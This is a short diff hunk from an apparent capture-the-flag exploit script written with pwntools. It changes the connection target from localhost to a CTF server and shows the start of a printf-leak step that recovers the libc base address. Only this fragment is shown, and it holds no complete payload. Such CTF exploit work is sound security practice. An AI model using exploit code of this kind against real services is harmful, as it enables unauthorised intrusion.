@@ -10,7 +10,7 @@ def main():
     context(arch="amd64")
     libc = ELF("docker-libc")
 
-    conn = remote("localhost", 1337)
+    conn = remote("ctf.dscmunich.de", 10003)
 
     # printf leak -> Find out libc base
     conn.recvuntil(b"mine is ")
